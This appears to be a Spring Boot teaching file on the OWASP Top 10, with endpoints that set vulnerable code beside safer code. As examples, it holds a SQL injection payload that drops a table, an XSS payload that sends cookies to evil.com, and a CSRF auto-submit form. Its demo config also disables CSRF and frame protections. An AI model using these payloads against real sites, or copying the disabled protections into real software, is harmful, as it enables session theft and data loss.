package com.academy;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.bind.annotation.*;

import java.security.SecureRandom;
import java.util.*;

/**
 * Day 29 — Part 1: OWASP Top 10 & Secure Coding
 * ================================================
 * Run: mvn spring-boot:run
 * Visit: http://localhost:8080/api/owasp-top10
 *
 * Topics: OWASP Top 10, SQL injection, XSS, CSRF, BCrypt,
 *         secure input validation, secure token generation
 */
@SpringBootApplication
public class Application {
    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @Bean
    public BCryptPasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12); // cost factor 12
    }
}

// ── Security Config: permit all for this demo ─────────────────────────────────
@EnableWebSecurity
class SecurityConfig {

    @Bean
    SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
            .csrf(csrf -> csrf.disable())
            .headers(h -> h.frameOptions(f -> f.disable()));
        return http.build();
    }
}

// ── Secure Code Utilities ─────────────────────────────────────────────────────
class SecureCodeExamples {

    private final BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder(12);
    private final SecureRandom secureRandom = new SecureRandom();

    /** Whitelist validation — only allow expected characters */
    public boolean validateUsername(String input) {
        if (input == null || input.isBlank()) return false;
        return input.matches("^[a-zA-Z0-9_]{3,30}$");
    }

    /** Strip dangerous HTML tags to prevent XSS */
    public String sanitizeHtml(String input) {
        if (input == null) return null;
        return input
            .replaceAll("<script[^>]*>.*?</script>", "")
            .replaceAll("<[^>]+>", "")
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;");
    }

    /** BCrypt hash — salted, adaptive, one-way */
    public String hashPassword(String plaintext) {
        return passwordEncoder.encode(plaintext);
    }

    /** BCrypt verify */
    public boolean verifyPassword(String plaintext, String hash) {
        return passwordEncoder.matches(plaintext, hash);
    }

    /** Cryptographically secure token */
    public String generateSecureToken() {
        byte[] bytes = new byte[32];
        secureRandom.nextBytes(bytes);
        return HexFormat.of().formatHex(bytes);
    }
}

// ── OWASP Reference Controller ────────────────────────────────────────────────
@RestController
@RequestMapping("/api")
class OwaspController {

    private final SecureCodeExamples examples = new SecureCodeExamples();

    @GetMapping("/owasp-top10")
    public Map<String, Object> owaspTop10() {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("source", "https://owasp.org/www-project-top-ten/");

        List<Map<String, String>> top10 = new ArrayList<>();

        top10.add(makeEntry("A01 - Broken Access Control",
            "Users can act outside intended permissions",
            "Enforce access control server-side; deny by default; use RBAC"));
        top10.add(makeEntry("A02 - Cryptographic Failures",
            "Weak/missing encryption exposes sensitive data",
            "Use TLS 1.2+, AES-256, BCrypt for passwords; never MD5/SHA1 for passwords"));
        top10.add(makeEntry("A03 - Injection",
            "SQL, NoSQL, OS, LDAP injection via untrusted data",
            "Use PreparedStatement/parameterized queries; ORM frameworks; input validation"));
        top10.add(makeEntry("A04 - Insecure Design",
            "Missing or flawed security controls by design",
            "Threat modeling; secure design patterns; reference architectures"));
        top10.add(makeEntry("A05 - Security Misconfiguration",
            "Default configs, unnecessary features, verbose errors",
            "Harden configs; disable defaults; remove unused features; restrict error detail"));
        top10.add(makeEntry("A06 - Vulnerable Components",
            "Libraries/frameworks with known vulnerabilities",
            "Keep dependencies updated; use OWASP Dependency-Check; monitor CVEs"));
        top10.add(makeEntry("A07 - Identification & Auth Failures",
            "Broken auth, weak passwords, session fixation",
            "MFA; strong passwords; secure session management; BCrypt passwords"));
        top10.add(makeEntry("A08 - Software & Data Integrity Failures",
            "Unverified code/data updates (e.g. supply chain attacks)",
            "Verify digital signatures; use trusted package sources; integrity checks"));
        top10.add(makeEntry("A09 - Security Logging Failures",
            "Insufficient logging prevents breach detection",
            "Log auth events, access control failures; protect logs; alert on anomalies"));
        top10.add(makeEntry("A10 - Server-Side Request Forgery (SSRF)",
            "App fetches remote resource without validating user-supplied URL",
            "Validate/sanitize all URLs; use allowlists for remote resources"));

        result.put("owaspTop10", top10);
        return result;
    }

    @GetMapping("/sql-injection-demo")
    public Map<String, Object> sqlInjectionDemo() {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("topic", "SQL Injection Prevention");

        Map<String, String> vulnerable = new LinkedHashMap<>();
        vulnerable.put("code",
            "String query = \"SELECT * FROM users WHERE name = '\" + username + \"'\";");
        vulnerable.put("attack",
            "username = \"'; DROP TABLE users; --\"");
        vulnerable.put("result",
            "Executes: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'");
        vulnerable.put("risk",   "Table destroyed, data leaked, auth bypassed");
        result.put("VULNERABLE", vulnerable);

        Map<String, String> safe = new LinkedHashMap<>();
        safe.put("code",
            "PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE name = ?\"); ps.setString(1, username);");
        safe.put("why",    "Parameter is treated as DATA, never as SQL code");
        safe.put("jpa",    "Spring Data JPA uses parameterized queries automatically");
        safe.put("result", "Attack input is escaped — safe and correct");
        result.put("SAFE", safe);

        return result;
    }

    @GetMapping("/xss-demo")
    public Map<String, Object> xssDemo() {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("topic", "Cross-Site Scripting (XSS) Prevention");

        Map<String, String> vulnerable = new LinkedHashMap<>();
        vulnerable.put("code",
            "response.getWriter().write(\"<h1>Hello \" + userInput + \"</h1>\");");
        vulnerable.put("attack",
            "<script>document.cookie='stolen='+document.cookie; fetch('https://evil.com/steal?c='+document.cookie)</script>");
        vulnerable.put("risk",   "Steals session cookies, redirects users, defaces page");
        result.put("VULNERABLE", vulnerable);

        Map<String, String> safe = new LinkedHashMap<>();
        safe.put("encode_output",  "Always HTML-encode user input before displaying: &lt;script&gt;");
        safe.put("use_thymeleaf",  "Thymeleaf th:text automatically escapes HTML");
        safe.put("use_react",      "React JSX escapes by default — avoid dangerouslySetInnerHTML");
        safe.put("csp_header",     "Set Content-Security-Policy header to restrict script sources");
        result.put("SAFE", safe);

        // Live demo of sanitization
        String malicious = "<script>alert('xss')</script><b>Hello</b>";
        result.put("sanitizedInput", examples.sanitizeHtml(malicious));

        return result;
    }

    @GetMapping("/secure-coding-comparison")
    public Map<String, Object> secureCodingComparison() {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("topic", "Insecure vs Secure Code Patterns");

        List<Map<String, String>> comparisons = new ArrayList<>();

        comparisons.add(Map.of(
            "issue",       "Hardcoded credentials",
            "insecure",    "String password = \"admin123\"; // in source code",
            "secure",      "String password = System.getenv(\"DB_PASSWORD\");",
            "why",         "Env vars are not committed to git; use secrets managers in production"
        ));
        comparisons.add(Map.of(
            "issue",       "Weak password hashing",
            "insecure",    "MessageDigest.getInstance(\"MD5\").digest(password.getBytes())",
            "secure",      "new BCryptPasswordEncoder(12).encode(password)",
            "why",         "MD5/SHA1 are fast — easily brute-forced. BCrypt is intentionally slow + salted"
        ));
        comparisons.add(Map.of(
            "issue",       "Logging sensitive data",
            "insecure",    "log.info(\"User login: \" + username + \" password: \" + password);",
            "secure",      "log.info(\"User login attempt for: {}\", username);",
            "why",         "Passwords/tokens in logs create audit violations and data leaks"
        ));
        comparisons.add(Map.of(
            "issue",       "Integer overflow",
            "insecure",    "int total = price * quantity; // can overflow",
            "secure",      "long total = (long) price * quantity; // or use BigDecimal for money",
            "why",         "Integer overflow can cause incorrect calculations silently"
        ));
        comparisons.add(Map.of(
            "issue",       "Exposing stack traces",
            "insecure",    "return ResponseEntity.status(500).body(e.toString());",
            "secure",      "log.error(\"Internal error\", e); return ResponseEntity.status(500).body(\"Internal server error\");",
            "why",         "Stack traces reveal implementation details useful to attackers"
        ));

        result.put("comparisons", comparisons);

        // Live BCrypt demo
        String hashed = examples.hashPassword("mySecurePassword123");
        result.put("bcryptDemo", Map.of(
            "plaintext",   "mySecurePassword123",
            "hashed",      hashed,
            "verified",    examples.verifyPassword("mySecurePassword123", hashed),
            "wrongPass",   examples.verifyPassword("wrongPassword", hashed),
            "note",        "Each BCrypt hash is unique even for the same input (salted)"
        ));

        result.put("secureToken", examples.generateSecureToken());

        return result;
    }

    @GetMapping("/csrf-demo")
    public Map<String, Object> csrfDemo() {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("topic", "CSRF (Cross-Site Request Forgery)");

        result.put("what", "Attacker tricks authenticated user's browser into sending unwanted requests");
        result.put("example", "User visits evil.com, which has: <form action='bank.com/transfer' method='POST'> <input name='amount' value='1000'> and auto-submits");
        result.put("prevention", List.of(
            "CSRF tokens — unique per-session token in every form; server validates",
            "SameSite cookie attribute — prevents cross-origin requests from sending cookies",
            "Spring Security: .csrf(csrf -> csrf.disable()) only for stateless APIs with JWT",
            "For stateful apps (sessions + forms): NEVER disable CSRF"
        ));
        result.put("springDefault", "Spring Security enables CSRF protection by default for session-based apps");

        return result;
    }

    private Map<String, String> makeEntry(String name, String description, String mitigation) {
        Map<String, String> entry = new LinkedHashMap<>();
        entry.put("name", name);
        entry.put("description", description);
        entry.put("mitigation", mitigation);
        return entry;
    }
}
